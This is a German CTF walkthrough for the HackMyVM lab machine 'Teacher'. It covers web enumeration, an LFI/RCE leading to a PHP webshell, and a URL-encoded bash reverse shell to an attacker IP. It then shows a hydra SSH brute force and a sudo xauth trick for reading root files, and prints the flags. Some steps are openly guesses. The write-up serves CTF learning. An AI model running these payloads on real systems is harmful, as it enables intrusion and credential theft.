# Teacher - HackMyVM (Easy)
 
![Teacher.png](Teacher.png)

## Übersicht

*   **VM:** Teacher
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Teacher)
*   **Schwierigkeit:** Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 24. Oktober 2023
*   **Original-Writeup:** https://alientec1908.github.io/Teacher_HackMyVM_Easy/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel der "Teacher"-Challenge war die Erlangung von User- und Root-Rechten. Der Weg begann mit der Enumeration eines Webservers (Port 80), auf dem die PHP-Dateien `/log.php` und `/access.php` gefunden wurden. Ein Kommentar in `/index.html` enthüllte die Benutzernamen `avijneyam` und `mrteacher`. Mittels `wfuzz` wurde eine Schwachstelle im `id`-Parameter von `access.php` identifiziert, die eine LFI/RCE (vermutlich durch Log Poisoning oder direktes Schreiben über LFI) ermöglichte. Eine PHP-Webshell wurde in `log.php` platziert und über `log.php?cmd=` ausgeführt, um eine Reverse Shell als `www-data` zu erhalten. Als `www-data` wurde die User-Flag im Home-Verzeichnis von `mrteacher` gelesen. Nach einer Phase der Metasploit-Exploration (die nicht direkt zum Erfolg führte) und dem Download einer PDF-Datei (`e14e...pdf`) wurde vermutlich aus dieser eine Passwortliste (`password2.txt`) abgeleitet. `hydra` knackte damit das SSH-Passwort (`ThankYouTeachers`) für `mrteacher`. Als `mrteacher` zeigte `sudo -l`, dass `/bin/xauth` und `/bin/gedit` als `root` ohne Passwort ausgeführt werden durften. Die Root-Flag wurde durch Ausnutzung von `sudo xauth source /root/root.txt` und anschließendem `xauth list` exfiltriert.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `wfuzz`
*   `curl` (impliziert)
*   `nc` (netcat)
*   `python` (python3)
*   `pty`
*   `find`
*   `cat`
*   `ls`
*   `cd`
*   `which`
*   `export`
*   `Metasploit` (msf6)
*   `hydra`
*   `ssh`
*   `apt`
*   `sudo`
*   `wget`
*   `chmod`
*   `linpeas.sh`
*   `xauth`
*   `echo`
*   `john`
*   `unshadow`
*   Standard Linux-Befehle (`id`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Teacher" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Findung mit `arp-scan` (`192.168.2.114`).
    *   `nmap`-Scan identifizierte offene Ports: 22 (SSH - OpenSSH 8.4p1) und 80 (HTTP - Apache 2.4.54).
    *   `gobuster` auf Port 80 fand `/index.html`, `/log.php`, `/access.php` und `/clearlogs.php`.
    *   Ein Kommentar in `/index.html` enthielt die Benutzernamen `avijneyam` und `mrteacher`.
    *   `wfuzz` auf `access.php` identifizierte den Parameter `id` als potenziellen LFI/RCE-Vektor.

2.  **Initial Access (LFI/RCE zu `www-data`):**
    *   Ausnutzung der Schwachstelle in `access.php?id=` (vermutlich LFI zum Schreiben einer Webshell in `log.php` oder eine direkte Command Injection, die das Schreiben ermöglicht).
    *   Platzieren einer PHP-Webshell (``) in `log.php`.
    *   Ausführung eines Bash-Reverse-Shell-Payloads über die Webshell: `http://192.168.2.114/log.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F[Angreifer-IP]%2F9001%200%3E%261%27`.
    *   Erlangung einer interaktiven Shell als `www-data` nach Stabilisierung.

3.  **Privilege Escalation (von `www-data` zu `mrteacher`):**
    *   User-Flag `9cd1f0b79d9474714c5a29214ec839a6` in `/home/mrteacher/user` gelesen.
    *   Exploration mit Metasploit (`shell_to_meterpreter`, `local_exploit_suggester`) führte nicht direkt zum Erfolg.
    *   Download einer PDF-Datei (`e14e...pdf`) vom Webserver. *Annahme: Aus dieser PDF wurde eine Passwortliste `password2.txt` erstellt.*
    *   `hydra -l mrteacher -P password2.txt ssh://teacher.hmv:22` knackte das SSH-Passwort: `ThankYouTeachers`.
    *   Erfolgreicher SSH-Login als `mrteacher`.

4.  **Privilege Escalation (von `mrteacher` zu `root` via `sudo xauth`):**
    *   `sudo -l` als `mrteacher` zeigte: `(ALL : ALL) NPASSWD: /bin/gedit, /bin/xauth`.
    *   Ausnutzung von `xauth` zum Auslesen der Root-Flag:
        1.  `sudo -u root xauth source /root/root.txt` (liest die Datei intern)
        2.  `xauth list` (zeigt den Inhalt der gelesenen Datei als "Magic Cookie" an)
    *   Die Ausgabe von `xauth list` enthielt die Root-Flag `b3386aefd470a6e309e54bc1be5eb774`.

## Wichtige Schwachstellen und Konzepte

*   **Informationsleck in HTML-Kommentar:** Enthielt Benutzernamen.
*   **Local File Inclusion (LFI) / Remote Code Execution (RCE):** Eine Schwachstelle in `access.php` (Parameter `id`) ermöglichte das Ausführen von Befehlen, vermutlich durch Log Poisoning oder direktes Schreiben einer Webshell.
*   **Passwort-Cracking (SSH):** Ein Benutzerpasswort wurde mittels `hydra` und einer abgeleiteten Wortliste geknackt.
*   **Unsichere `sudo`-Konfiguration (`xauth`):** Die Erlaubnis, `/bin/xauth` als `root` ohne Passwort auszuführen, ermöglichte das Auslesen beliebiger Dateien, auf die Root Lesezugriff hat, durch Missbrauch der `source`- und `list`-Funktionen.
*   **Metasploit Exploration:** Versuch, mit Standard-Exploits und Suggestern zu eskalieren (hier nicht direkt erfolgreich).

## Flags

*   **User Flag (`/home/mrteacher/user`):** `9cd1f0b79d9474714c5a29214ec839a6`
*   **Root Flag (ausgelesen via `xauth`):** `b3386aefd470a6e309e54bc1be5eb774`

## Tags

`HackMyVM`, `Teacher`, `Easy`, `LFI`, `RCE`, `PHP`, `Password Cracking`, `Hydra`, `sudo Exploitation`, `xauth`, `Metasploit`, `Linux`, `Web`, `Privilege Escalation`
